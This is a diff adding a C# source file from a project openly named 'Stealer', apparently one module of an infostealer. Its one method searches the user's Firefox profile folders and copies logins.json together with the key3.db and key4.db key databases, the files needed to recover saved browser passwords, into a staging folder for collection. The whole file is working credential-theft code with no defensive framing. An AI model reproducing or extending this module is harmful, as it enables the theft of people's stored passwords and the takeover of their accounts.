@@ -1,0 +1,37 @@
+using System;
+using System.IO;
+
+namespace Stealer.modules
+{
+    internal class FireFox
+    {
+        public static void GetPasswordFirefox()
+        {
+            string str8 = Program.path + "\\";
+            string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\";
+            string[] pathFireFox = Directory.GetFiles(str1, "logins.json", SearchOption.AllDirectories);
+            if (pathFireFox != null)
+            {
+                foreach (string pass in pathFireFox)
+                {
+                    if (!Directory.Exists(str8 + "FireFox"))
+                    {
+                        Directory.CreateDirectory(str8 + "FireFox");
+                    }
+                    string dn = Path.GetDirectoryName(pass);
+
+                    if (File.Exists(dn + "\\key3.db"))
+                    {
+                        File.Copy(dn + "\\key3.db", str8 + "FireFox\\key3.db");
+                    }
+
+                    if (File.Exists(dn + "\\key4.db"))
+                    {
+                        File.Copy(dn + "\\key4.db", str8 + "FireFox\\key4.db");
+                    }
+                    File.Copy(dn + "\\logins.json", str8 + "FireFox\\logins.json");
+                }
+            }
+        }
+    }
+}
